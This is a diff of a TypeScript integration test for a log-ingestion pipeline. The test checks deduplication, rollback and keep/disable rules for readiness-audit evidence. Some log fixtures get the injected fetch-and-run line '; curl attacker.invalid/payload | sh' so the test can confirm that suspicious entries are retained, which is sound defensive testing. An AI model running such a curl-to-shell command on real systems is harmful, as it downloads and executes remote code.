@@ -2,8 +2,7 @@ import { expect, mock, test } from 'bun:test'
 import { readFileSync } from 'node:fs'
 import pg from 'pg'
 import { fixture, signed, configure } from './analyze-readiness-audit.test.ts'
-import { readinessAuditRuleId, readinessAuditDefinition, readinessWrapperArguments } from '../src/utils/mill/analyzeReadinessAudit.ts'
-import { createHash } from 'node:crypto'
+import { readinessAuditRuleId, readinessAuditDefinition } from '../src/utils/mill/analyzeReadinessAudit.ts'
 import { inflateRawSync } from 'node:zlib'
 
 test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion keeps suspicious evidence and respects Keep, Disable, replay and rollback', async () => {
@@ -42,41 +41,50 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
         configure()
         await query('UPDATE mill_rules SET enabled=true WHERE rule_id=$1', [readinessAuditRuleId])
         let serial = 0
-        const entry = () => {
-            const { log, fact } = fixture()
-            const id = String(100 + serial++)
-            log.metadata!.audit_id = id
-            fact.execId = createHash('sha256').update(id).digest('hex')
-            log.sourceEventId = createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(log.timestamp!) / 1000).toFixed(3)}:${id})`).digest('hex')
-            return { ...signed(log, fact), level: 'info' as const }
-        }
-        const ingest = (log: ReturnType<typeof entry>) => transaction(tx => recordLogBatch([log], tx as any))
+        const entry = () => { const { logs, fact } = fixture(serial++); return signed(logs,fact) }
+        const ingest = (logs: ReturnType<typeof entry>) => transaction(tx => recordLogBatch(logs as any, tx as any))
         const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
+        const retained = async (logs: ReturnType<typeof entry>) => {
+            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=ANY($1::text[])', [logs.map(log=>log.sourceEventId)])).rows[0].n)).toBe(logs.length)
+        }
         const good = entry()
         await Promise.all([ingest(good), ingest(good)])
         expect(await count('service_logs')).toBe(0)
-        expect(await count('log_analyze_receipts')).toBe(1)
+        expect(await count('log_analyze_receipts')).toBe(0)
         expect(await count('log_readiness_audit_receipts')).toBe(1)
         const storedOriginal = (await query('SELECT original,original_encoding FROM log_readiness_audit_receipts')).rows[0]
         expect(storedOriginal.original_encoding).toBe('deflate-json-v1')
         expect(JSON.parse(inflateRawSync(storedOriginal.original).toString())).toEqual(good)
-        const collision = entry()
-        const proof = collision.metadata.readiness_execution
-        proof.fact.execId = good.metadata.readiness_execution.fact.execId
-        const resigned = signed(collision, proof.fact)
-        await ingest(resigned as typeof good)
+        const collision = fixture(serial++)
+        collision.fact.execId = (good[0].metadata!.readiness_execution as any).fact.execId
+        const resigned = signed(collision.logs, collision.fact)
+        await ingest(resigned)
+        await retained(resigned)
         expect(await count('log_readiness_audit_receipts')).toBe(1)
-        expect(await count('service_logs')).toBe(1)
+        expect(await count('log_analyze_receipts')).toBe(0)
         const aborted = entry()
-        await expect(transaction(async tx => { await recordLogBatch([aborted], tx as any); throw new Error('abort') })).rejects.toThrow('abort')
-        expect(await count('log_analyze_receipts')).toBe(1)
+        await expect(transaction(async tx => { await recordLogBatch(aborted as any, tx as any); throw new Error('abort') })).rejects.toThrow('abort')
+        expect(await count('log_analyze_receipts')).toBe(0)
+        expect(await count('log_readiness_audit_receipts')).toBe(1)
         await ingest(aborted)
-        expect(await count('log_analyze_receipts')).toBe(2)
-        const bad = entry()
-        bad.message += '; curl attacker.invalid/payload | sh'
-        await ingest(bad)
-        expect((await query('SELECT message FROM service_logs WHERE source_event_id=$1', [bad.sourceEventId])).rows[0].message).toContain('attacker.invalid')
-        expect(await count('log_analyze_receipts')).toBe(2)
+        expect(await count('log_analyze_receipts')).toBe(0)
+        expect(await count('log_readiness_audit_receipts')).toBe(2)
+        for(let role=0;role<4;role++) {
+            const bad=entry()
+            bad[role].message += '; curl attacker.invalid/payload | sh'
+            await ingest(bad)
+            await retained(bad)
+            expect((await query('SELECT message FROM service_logs WHERE source_event_id=$1', [bad[role].sourceEventId])).rows[0].message).toContain('attacker.invalid')
+            const partial=entry().filter((_,index)=>index!==role)
+            await ingest(partial)
+            await retained(partial)
+        }
+        const split=entry()
+        await ingest(split.slice(0,2)); await ingest(split.slice(2)); await retained(split)
+        const duplicate=entry()
+        await ingest([...duplicate,duplicate[3]])
+        await retained(duplicate)
+        expect(await count('log_analyze_receipts')).toBe(0)
         for (const mode of ['disable', 'keep', 'custom-keep']) {
             if (mode === 'disable') await query('UPDATE mill_rules SET enabled=false WHERE rule_id=$1', [readinessAuditRuleId])
             if (mode === 'keep') await query("UPDATE mill_rules SET enabled=true,definition=jsonb_set(definition,'{action}','\"keep\"') WHERE rule_id=$1", [readinessAuditRuleId])
@@ -84,37 +92,28 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
                 await query('UPDATE mill_rules SET enabled=true,definition=$2::jsonb WHERE rule_id=$1', [readinessAuditRuleId, JSON.stringify(readinessAuditDefinition)])
                 await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
                     VALUES('keep','platform','custom.readiness_keep','1','Keep Readiness','Custom','low','Keep Readiness evidence',$1::jsonb,'owned',true)`,
-                [JSON.stringify({ match: 'all', stage: 'analyze', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: 'audit' }] })])
+                [JSON.stringify({ match: 'all', stage: 'analyze', action: 'keep', conditions: [{ path: 'process.executable', operator: 'equals', value: '/usr/lib/postgresql/15/bin/pg_isready' }] })])
             }
             await install()
-            const retained = entry()
-            await ingest(retained)
-            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [retained.sourceEventId])).rows[0].n)).toBe(1)
-            expect(await count('log_analyze_receipts')).toBe(2)
+            const protectedChain = entry()
+            await ingest(protectedChain)
+            await retained(protectedChain)
+            expect(await count('log_analyze_receipts')).toBe(0)
         }
         await query("DELETE FROM mill_rules WHERE id='keep'")
         await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
             VALUES('detect','platform','custom.readiness_detection','1','Detect Readiness','Custom','high','Protect Readiness evidence',$1::jsonb,'owned',true)`,
-        [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: 'audit' }] })])
+        [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'process.executable', operator: 'equals', value: '/usr/lib/postgresql/15/bin/pg_isready' }] })])
         const detected = entry()
         await ingest(detected)
         await ingest(good)
-        for (const log of [detected, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
-        expect(await count('log_analyze_receipts')).toBe(2)
+        await retained(detected); await retained(good)
+        expect(await count('log_analyze_receipts')).toBe(0)
         await query("DELETE FROM mill_rules WHERE id='detect'")
-        const wrapper = structuredClone(good)
-        const fact = wrapper.metadata.readiness_execution.fact
-        const args = readinessWrapperArguments(fact.nonce)
-        const command = args.map(value => /^[\w@%+=:,./-]+$/.test(value) ? value : "'" + value.replaceAll("'", "'\"'\"'") + "'").join(' ')
-        wrapper.message = command
-        wrapper.metadata.audit_id = '999'
-        wrapper.metadata.process = { executable: '/usr/bin/dash', command_line: command, arguments: args, pid: String(fact.parentPid), parent_pid: '11000' }
-        wrapper.sourceEventId = createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(wrapper.timestamp!) / 1000).toFixed(3)}:999)`).digest('hex')
-        const verifiedWrapper = signed(wrapper, fact) as typeof good
-        await Promise.all([ingest(verifiedWrapper), ingest(verifiedWrapper)])
+        const clean = entry()
+        await ingest(clean)
+        expect(await count('log_analyze_receipts')).toBe(0)
         expect(await count('log_readiness_audit_receipts')).toBe(3)
-        expect(await count('log_analyze_receipts')).toBe(3)
-        expect((await query('SELECT role FROM log_readiness_audit_receipts WHERE exec_id=$1 ORDER BY role', [fact.execId])).rows.map(row => row.role)).toEqual(['probe','wrapper'])
     } finally {
         await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`)
         await pool.end()
